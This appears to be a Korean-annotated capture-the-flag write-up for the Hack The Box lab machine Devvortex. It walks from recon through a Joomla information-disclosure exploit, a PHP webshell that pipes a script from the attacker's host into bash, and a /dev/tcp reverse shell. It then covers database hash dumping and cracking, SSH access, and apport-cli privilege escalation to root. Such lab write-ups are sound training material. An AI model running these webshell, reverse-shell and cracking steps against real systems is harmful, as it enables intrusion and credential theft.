Machine: Devvortex
TARGET: 10.129.229.146

nmap -sV -sC -oA nmap/Devvortext $ip  

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

/etc/hosts에 아래줄 추가
10.129.229.146  devvortex.htb
http://devvortex.htb/
디렉토리 탐색 + 웹페이지 탐색결과 별다른 단서 찾지못함

하위도메인 탐색
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -fw 4 -t 100

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 305ms]

/etc/hosts에 아래줄 추가
10.129.229.146  dev.devvortex.htb

http://dev.devvortex.htb/ 접속

wappalyzer로 확인결과 Joomla CMS사용중

http://dev.devvortex.htb/administrator/manifests/files/joomla.xml 에서 현재 사용중인 버전 확인가능
Joomla 4.2.6
CVE-2023-23752 취약점 존재

https://github.com/Acceis/exploit-CVE-2023-23752

ruby exploit.rb http://dev.devvortex.htb 
Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0

http://dev.devvortex.htb/administrator/
lewis
P4ntherg0t1n5r3c0n## 로 로그인

System > Site Templates > Cassiopeia Details and Files
error.php수정
<?php system("curl 10.10.14.72:80/rev.sh|bash"); ?>

echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.72/4444 0>&1' > rev.sh

python3 -m http.server 80
nc -lnvp 4444
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
리버스셸 연결 성공

cat configuration.txt

        public $user = 'lewis';
        public $password = 'P4ntherg0t1n5r3c0n##';

mysql 평문 비밀번호 획득

mysql -u lewis -p
P4ntherg0t1n5r3c0n##
접속

show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+

use joomla

show tables;
| sd4fg_users                   |


mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2025-08-04 15:14:46 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)
logan의 계정 정보를 크래킹시도

hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'                
Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 


hashcat -m 3200 -a 0 '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' /usr/share/wordlists/rockyou.txt
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho


ssh logan@10.129.229.146
tequieromucho
logan 사용자로 ssh 접속 성공


cat /home/logan/user.txt 
73fb4da8154226194662a390d14722eb


sudo -l

    (ALL : ALL) /usr/bin/apport-cli


https://github.com/diego-tella/CVE-2023-1326-PoC

CVE-2023-1326 apport-cli에 권한상승 취약점 존재

echo "ProblemType: Crash" >> /tmp/test.crash 크래시 파일 생성
sudo /usr/bin/apport-cli -c /tmp/test.crash
press V (view report)
!/bin/bash

루트 bash셸 획득

cat root.txt 
30ab4a0362b3f1a679ad98976266883d
